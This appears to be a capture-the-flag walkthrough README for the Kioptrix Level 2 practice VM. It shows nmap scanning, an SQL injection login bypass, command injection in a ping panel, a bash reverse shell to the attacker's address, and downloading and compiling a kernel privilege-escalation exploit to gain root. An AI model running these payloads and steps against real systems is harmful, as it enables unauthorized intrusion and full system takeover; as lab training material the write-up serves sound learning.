# Kioptrix-level-2-Walk-through


### download the machine from 

then launch using VMware 

no credintial are provided 


Notes :
----

make sure your system is upgraded           
sudo apt update && sudo apt upgrade                 
sudo apt install exploitdb 

make sure your main system and the target on the same network

and make sure that you downloaded the fixed version not the bugged one 

scan the target using nmap 
--
Nmap -sn 192.168.1.*

got the kioptrix vm ip at 

Nmap -sC -sV 192.168.1.104

found some open ports ( 22-80-111,443)
  
now lets walkthrough each port and see what we can do (separately and combined):
----
couldn't verfy that any service is vulnarble so i've move to surf the web server 

well there is a login page , viewing the source code gives me hint to login as admin 

trying basics credintial like admin:admin and admin:password  not working 

but a login page is a sign of sqli

so i've tried admin:'

but no errors are displayed

try admin:'or'1'='1 as the simplest method of sqli

and iam in and there is admin panel for pining local host 

agood sign of command injection 

so i've tryed ;ls and the command worked 

now we get our shell by listening with our machin and inject this command to the admin pannel 

; bash -i >& /dev/tcp/192.168.0.19/443 0>&1

now we've got user shell 

attemping a priv escilation 

1- try sudo -l : failed

2- trying to steel ssh key : failed

3-trying nmap --interactive 

!sh 

failed:D

4- searching for a custom exploit for the exact version of system

uname -a >> CentOs 

searchsploit Centos escilation 

Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PP | linux/local/9545.c

choose this one 

searchsploit -m linux/local/9545.c 

now and since the target has gcc installed we will move the exploit and compile it there

in the same directory as the exploit is run this command 

python -m SimpleHTTPServer 80

now on the shell we obtained earlier from the target , download the exploit 

wget http://192.168.1.2/9545.c

compile 

gcc -o escilation 9545.c

./escilation

id >> root 

Thanks for taking some time reading this i hope it was useful please don't hesitate correcting me any mistake for giving me advise
 ----


